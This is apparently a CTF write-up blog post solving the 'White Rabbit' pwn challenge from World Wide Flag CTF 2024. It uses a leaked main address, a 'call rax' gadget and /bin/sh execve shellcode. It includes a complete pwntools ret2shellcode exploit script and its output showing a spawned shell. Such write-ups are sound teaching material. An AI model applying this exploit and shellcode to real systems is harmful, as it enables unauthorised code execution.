---
title: World Wide Flag CTF 2024
description: Just some pwn challenges I have solved after the CTF ended because of busyness
author: 5o1z
date: 2024-12-7 6:34 +0700
categories: [CTF Write ups]
tags: [pwn, pwntools, shellcode]
image:
  path: /assets/img/WWF/image.png
---

## White Rabbit

### Description

> Just a nice easy warmup for you...

### Analysis

#### General information

```sh
  (\_/)
  ( •_•)
  / > 0x556bdd42d180

follow the white rabbit...
```

```sh
[*] '/home/alter/CTFs/WWF_2024/pwn/white_rabbit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

So we can see here, the binary have no canary and the PIE is enabled. One more thing is `Stack` is executable and it leak the address each time we run the binary. So we can think about `ret2shellcode`

#### Brain time

So my experience for this is just take that address and maybe we will need it, so this is my code for take that leak address:

```py
p.recvuntil(b'/ > ')
leak = int(p.recvline()[:-1], 16)
info("[+] Leak: " + hex(leak))
```

Just check what that address it leak is by using dynamic debugging. I'm breakpoint at `follow()` function. We can see our leak address in my case is `0x555555555180` (I have disabled `ASLR` for easier). When I look around there is the leak address of `main` function:

```sh
gef➤  disas*main
Dump of assembler code for function main:
   0x0000555555555180 <+0>:     push   rbp
```

Or we can look at pseudocode in IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("\n  (\\_/)");
  puts(asc_200D);
  printf("  / > %p\n\n", main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```

As said before, the idea of ​​this post is ret2shellcode so what we need to find is:

- Offset from input to RIP
- Gadget
- Craft shellcode

For the offset it a little bit easy so I will skip this

The next step involves identifying the gadget. To identify the gadget in a PIE (Position Independent Executable) binary, tools like ROPgadget and ropper are used. However, because PIE is enabled, these tools cannot display the absolute addresses of gadgets. Instead, they provide offsets relative to the binary's base address, which is determined only at runtime.

To work around this, I used `ROPchain` to find the gadget's offset. Then, I calculated its relative position by comparing the gadget’s offset to the address of the main function in the binary. To do this, I first disassembled the main function in GDB before running the binary, capturing its pre-loading address. Subtracting the gadget's offset from main’s address gave me the relative offset, which remains consistent between local and remote execution of the binary due to the fixed layout enforced by PIE.

```sh
➜  pwn ROPgadget --binary white_rabbit | grep "call rax"
0x000000000000100d : add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
0x0000000000001014 : call rax
0x0000000000001012 : je 0x1016 ; call rax
0x0000000000001010 : test eax, eax ; je 0x1016 ; call rax
0x000000000000100f : test rax, rax ; je 0x1016 ; call rax
```

```sh
gef➤  disas*main
Dump of assembler code for function main:
   0x0000000000001180 <+0>:     push   rbp
```

So our gadget's offset is `0x1180` - `0x10bf`= `0xc1`. But why is `call rax`? Because in the `x86-64` calling convention, the return value of a function is typically stored in the `RAX` register. This convention applies to most functions, including standard library functions like `gets`.

The last one is shellcode, just basic `/bin/sh` shellcode:

```nasm
    push 0x3b
    pop rax

    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    cdq
    push rdx
    pop rsi

    syscall
```

### Exploit

```py
#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./white_rabbit', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*follow+20
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

p.recvuntil(b'/ > ')
leak = int(p.recvline()[:-1], 16)
info("[+] Leak: " + hex(leak))


gadget = leak - 0xc1

shellcode = asm("""
    push 0x3b
    pop rax

    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    cdq
    push rdx
    pop rsi

    syscall
""", arch="amd64")

pl = flat(
    shellcode.ljust(120, b'A'),
    p64(gadget)
    )

p.sendline(pl)
p.interactive()

```

```sh
➜  pwn ./exploit.py
[+] Starting local process '/home/alter/CTFs/WWF_2024/pwn/white_rabbit': pid 4428
[!] ASLR is disabled!
[*] [+] Leak: 0x555555555180
[*] Switching to interactive mode

follow the white rabbit...
$ whoami
alter
```
